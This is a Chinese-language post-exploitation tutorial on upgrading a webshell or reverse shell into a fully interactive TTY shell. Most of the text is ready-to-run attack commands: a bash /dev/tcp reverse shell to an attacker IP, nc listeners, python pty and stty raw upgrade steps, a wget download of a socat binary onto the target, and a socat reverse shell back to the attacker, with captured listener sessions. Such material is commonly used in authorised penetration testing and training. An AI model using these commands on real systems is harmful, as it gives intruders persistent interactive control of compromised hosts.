# 实现交互式shell的几种方式

当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。

那我们怎么获取一个可交互的webshell呢？

## 1. python pty 方式

一般我们都会使用nc来接收反弹来的shell，只需要在目标上\(以linux为例\)执行：

```bash
bash -i >& /dev/tcp/192.168.2.134/4444 0>&1
```

本地接收一下就ok了，但是反弹回来的shell，或多或少都会存在问题，比如当我想使用top命令时就会提示没有 `tty`。简单的来说就是没有上下文环境，这样的话，`vim`，`sudo`等操作都做不了，有时候还需要其他工具，很麻烦。

```bash
C:\Users\w5023
λ nc -lvvp 4444
listening on [any] 4444 ...
connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30688
ubuntu@ubuntu:~$ whoami
whoami
ubuntu
ubuntu@ubuntu:~$ top
top
top: failed tty get
ubuntu@ubuntu:~$ tty
tty
not a tty
```

但是如果发现对方机器上有 python 的话，我们可以：

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://saucer-man.com/usr/uploads/2019/06/3893556663.png)

可以实现简单的tty，但是这种方式有个问题，当我们ctrl+C的时候，所有连接都会断掉，又需要重新来一遍，而且vim虽然可以用，也有点问题，同时没有记录，无法使用上方向键执行上条命令。

## 2. 升级nc为完全交互

整个流程是在第一步的基础上，但是需要用到的工具在linux上，所以把攻击机切换为linux。

现在攻击机和目标机分别为：

* 攻击机 Linux 192.168.81.160
* 目标机 Linux 192.168.81.162

简单把反弹一个完全交互shell的过程写出来

```bash
# 攻击机本地执行
# 首先检查当前终端和STTY信息
$ echo $TERM      
$ stty -a 
# nc开启监听
$ nc -lvvp 4444
```

![](https://saucer-man.com/usr/uploads/2019/06/9701011.png)

```bash
# 目标机执行
$ bash -i >& /dev/tcp/192.168.81.160/4444 0>&1
```

```bash
# 此时攻击机已经获取到了bash
# 接下来执行
$ python -c 'import pty; pty.spawn("/bin/bash")'  //启用python交互式
# 把它丢到后台挂起
$ ctrl + z   
# 重置stty，也就意味着你看不到输入的内容
$ stty raw -echo  
# 把后台挂起的程序调回前台
$ fg  
# 完全刷新终端屏幕
$ reset  
# 接下来设置环境变量，根据第一步得到的环境变量来设置
$ export SHELL=bash   
$ export TERM=xterm-256color   
$ stty rows 行数 columns 列数
```

到这里，就可以得到一个完美的shell了。

## 3. 使用socat

socat是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，**只能在linux下面运行**

下载地址：[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

使用起来也很简单。

* 攻击机：

  ```bash
  # 首先安装
  $ sudo apt install socat
  # 执行
  $ socat file:`tty`,raw,echo=0 tcp-listen:4444
  ```

* 目标机

  ```bash
  # 把socat上传到目标机器上或者直接下载
  $ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
  # 运行
  $ chmod +x /tmp/socat
  $ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
  ```

这种方式基本和ssh类似，ctrl+C也不会直接断开。

## 4. script获取pty

我们可以使用 Linux 系统下的 `script` 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 `top` 和 `vim` :

```bash
$ script /dev/null
```

如果不加 `/dev/null` 的话，会在当前路径下生成一个名字是 `typescript` 的文件，记录着在 script 生命周期里你执行的所有命令和结果。

结果：

```bash
C:\Users\w5023
λ nc -lvvp 4444
listening on [any] 4444 ...
connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567
ubuntu@ubuntu:~$ tty
tty
not a tty
ubuntu@ubuntu:~$ script /dev/null
script /dev/null
Script started, file is /dev/null
ubuntu@ubuntu:~$ tty
tty
/dev/pts/1
```

## 5. 参考

* [https://www.freebuf.com/news/142195.html](https://www.freebuf.com/news/142195.html)
* [http://blog.evalbug.com/2018/07/25/antsword\_prompt\_shell](http://blog.evalbug.com/2018/07/25/antsword_prompt_shell)

